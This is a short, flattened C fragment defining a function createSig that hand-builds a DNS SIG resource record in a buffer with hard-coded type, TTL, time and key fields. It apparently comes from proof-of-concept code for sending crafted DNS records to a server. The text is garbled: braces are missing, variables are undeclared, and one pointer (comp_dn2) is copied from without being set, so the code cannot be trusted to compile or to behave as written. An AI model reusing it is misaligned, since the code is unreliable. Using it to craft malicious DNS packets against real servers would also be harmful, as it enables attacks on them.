int createSig (u_char *buf) u_char * comp_dn , * comp_dn2 ; comp_dn = ( unsigned char * ) malloc ( 200 * sizeof ( unsigned char ) ); comp_size = dn_comp ( ( const char * ) exp_dn , comp_dn , 200 , dnptrs , lastdnptr ); printf ( "comp_size = %d\n" , comp_size ); printf ( "exp_dn = %s, comp_dn = %s\n" , exp_dn , ( char * ) comp_dn ); for(i=0; i<comp_size; i++) * p ++ = * comp_dn ++; len += comp_size; PUTSHORT ( 24 , p ); p += 2; PUTSHORT ( C_IN , p ); p += 2; PUTLONG ( 255 , p ); p += 4; PUTSHORT ( 30 , p ); p += 2; len += 10; PUTSHORT ( 15 , p ); p += 2; PUTSHORT ( 256 * 2 , p ); p += 2; PUTLONG ( 255 , p ); p += 4; PUTLONG ( now + 20000 , p ); p += 4; PUTLONG ( now , p ); p += 4; PUTSHORT ( 100 , p ); p += 2; len += 18; printf ( "comp_size = %d\n" , comp_size ); len += comp_size; for(i=0; i<comp_size; i++) * p ++ = * comp_dn2 ++; PUTLONG ( 123 , p ); p += 4; len += 4; return ( p - buf ) ; 